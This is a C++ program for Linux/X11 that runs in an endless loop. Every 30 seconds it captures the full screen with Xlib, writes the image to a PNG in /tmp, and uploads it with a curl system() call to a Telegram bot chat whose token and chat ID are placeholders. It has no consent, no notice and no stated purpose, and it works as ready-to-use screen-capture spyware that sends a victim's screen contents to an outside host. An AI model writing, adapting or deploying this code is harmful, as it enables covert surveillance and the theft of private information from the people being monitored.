#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <chrono>
#include <cstdlib>
#include <ctime>
#include <curl/curl.h>
#include <fstream>
#include <iostream>
#include <png.h>
#include <string>
#include <unistd.h>
#include <vector>

const std::string bot_token = "BOT_TOKEN";
const std::string chat_id = "CHAT_ID";
const int interval = 30;

void send_photo(const std::string& file_path)
{
    std::string url = "https://api.telegram.org/bot" + bot_token + "/sendPhoto";
    std::string command = "curl -s -F chat_id=" + chat_id + " -F photo=@" + file_path + " " + url;

    std::system(command.c_str());
}

void capture_screenshot(const std::string& file_path)
{
    Display* display = XOpenDisplay(nullptr);
    Window root = DefaultRootWindow(display);

    XWindowAttributes window_attributes;
    XGetWindowAttributes(display, root, &window_attributes);

    int width = window_attributes.width;
    int height = window_attributes.height;

    XImage* image = XGetImage(display, root, 0, 0, width, height, AllPlanes, ZPixmap);
    if (!image) {
        std::cerr << "Failed to capture screenshot." << std::endl;
        return;
    }

    std::vector<uint8_t> pixels(width * height * 4);
    for (int y = 0; y < height; ++y) {
        for (int x = 0; x < width; ++x) {
            unsigned long pixel = XGetPixel(image, x, y);
            unsigned char blue = pixel & 0xFF;
            unsigned char green = (pixel >> 8) & 0xFF;
            unsigned char red = (pixel >> 16) & 0xFF;
            unsigned char alpha = 255;

            int index = (y * width + x) * 4;
            pixels[index] = red;
            pixels[index + 1] = green;
            pixels[index + 2] = blue;
            pixels[index + 3] = alpha;
        }
    }

    XDestroyImage(image);
    XCloseDisplay(display);

    FILE* fp = fopen(file_path.c_str(), "wb");
    if (!fp) {
        std::cerr << "Failed to create screenshot file." << std::endl;
        return;
    }

    png_structp png_ptr = png_create_write_struct(PNG_LIBPNG_VER_STRING, nullptr, nullptr, nullptr);
    if (!png_ptr) {
        std::cerr << "Failed to create PNG write structure." << std::endl;
        fclose(fp);
        return;
    }

    png_infop info_ptr = png_create_info_struct(png_ptr);
    if (!info_ptr) {
        std::cerr << "Failed to create PNG info structure." << std::endl;
        png_destroy_write_struct(&png_ptr, nullptr);
        fclose(fp);
        return;
    }

    png_init_io(png_ptr, fp);

    png_set_IHDR(png_ptr, info_ptr, width, height, 8, PNG_COLOR_TYPE_RGBA,
        PNG_INTERLACE_NONE, PNG_COMPRESSION_TYPE_DEFAULT,
        PNG_FILTER_TYPE_DEFAULT);
    png_write_info(png_ptr, info_ptr);

    std::vector<png_bytep> row_pointers(height);
    for (int y = 0; y < height; ++y) {
        row_pointers[y] = reinterpret_cast<png_bytep>(&pixels[y * width * 4]);
    }

    png_write_image(png_ptr, row_pointers.data());
    png_write_end(png_ptr, info_ptr);

    png_destroy_write_struct(&png_ptr, &info_ptr);
    fclose(fp);
}

int main()
{
    while (true) {
        auto now = std::chrono::system_clock::now();
        std::time_t current_time = std::chrono::system_clock::to_time_t(now);
        std::string time_string = std::to_string(current_time);

        std::string screenshot_file = "/tmp/screenshot-" + time_string + ".png";
        capture_screenshot(screenshot_file);

        send_photo(screenshot_file);

        sleep(interval);
    }

    return 0;
}
